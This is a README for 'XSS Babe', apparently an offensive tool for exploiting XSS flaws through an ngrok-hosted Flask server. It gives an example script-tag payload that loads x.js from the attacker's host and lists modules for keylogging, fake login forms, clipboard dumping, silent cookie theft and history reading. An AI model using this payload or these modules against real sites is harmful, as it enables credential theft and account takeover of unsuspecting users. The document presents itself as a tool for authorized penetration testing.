# XSS BABE

XSS Babe is a tool for exploiting XSS vulnerabilities in real time. 
It automates delivery, tracking, and payload interaction through a live command-line interface. 

*this tool is functional but still a work in progress, should be done with the final touches in the next few days xx0xx

## ⚠️ Legal Disclaimer

This tool is for educational and ethical penetration testing only. 
Do not use it against targets without permission. 
You are solely responsible for how you use this software.

---

## Installation

### 1. Clone the Repo

```bash
git clone https://github.com/ekomsSavior/XSS-BABE.git
cd XSS-BABE
```

### 2. Install Dependencies

```bash
sudo apt update
sudo apt install python3 unzip -y
sudo apt install python3-flask python3-pyngrok -y
```

### 3. Install Ngrok

```bash
wget https://bin.equinox.io/c/bNyj1mQVY4c/ngrok-stable-linux-amd64.zip
unzip ngrok-stable-linux-amd64.zip
sudo mv ngrok /usr/local/bin/
```

---

## Ngrok Setup

1. Sign up at https://ngrok.com/signup  
2. Copy your auth token from: https://dashboard.ngrok.com/get-started/setup  
3. Add your token:

```bash
ngrok config add-authtoken YOUR_TOKEN_HERE
```

---

## Usage

```bash
python3 xss_babe_cli.py
```

### What It Does:
- Prompts for a target XSS URL (like: `https://vuln.site/?q=`)
- Auto-launches the Flask server and Ngrok
- Injects `x.js` loader into your payload
- Displays a live menu of attack modules
- Logs all browser events and saves session results in `sessions/`

---

## Example Payload

Use the Ngrok URL + this payload in the vulnerable input:

```html
<script src="https://YOUR_NGROK_URL/static/x.js"></script>
```

---

## Modules List

| Module            | Description                                      |
|-------------------|--------------------------------------------------|
| keylogger         | Records keystrokes in real time                  |
| fake_login        | Displays fake login form for credential capture  |
| clipboard         | Dumps contents of the victim’s clipboard         |
| auto_cookie_steal | Extracts document cookies silently               |
| browser_history   | Reads browser history if accessible              |
| download_bait     | Triggers fake file downloads (ZIP/PDF/etc)       |
| fingerprint       | Collects user-agent, screen size, timezone       |
| screenshot        | Captures visual screenshot using HTML2Canvas     |
| recon             | Loads iframe ports and resources for open recon  |
| cross_tab_spy     | Detects and tracks multiple open tabs            |

---

## File Structure

```
xss_babe/
├── xss_babe_cli.py             # Main interactive CLI
├── server.py                   # Flask server for payload delivery
├── requirements.txt            # Python dependencies
├── static/
│   ├── x.js                    # XSS loader script
│   └── modules/
│       ├── keylogger.js
│       ├── fake_login.js
│       ├── clipboard.js
│       ├── auto_cookie_steal.js
│       ├── browser_history.js
│       ├── download_bait.js
│       ├── fingerprint.js
│       ├── screenshot.js
│       ├── recon.js
│       └── cross_tab_spy.js
├── utils/
│   └── save_to_txt.py          # Helper to save session info
└── sessions/
    └── [timestamp].txt         # Auto-generated session logs
```

---

## Logs and Reporting

All session output (payloads used, timestamps, logs) are saved to:

```
sessions/YYYY-MM-DD-HHMMSS.txt
```

---

## Stay Ethical

Use XSS Babe only in lab environments or on targets you own or have permission to test. 

---

##  Developed by [ekomsSavior](https://github.com/ekomsSavior)
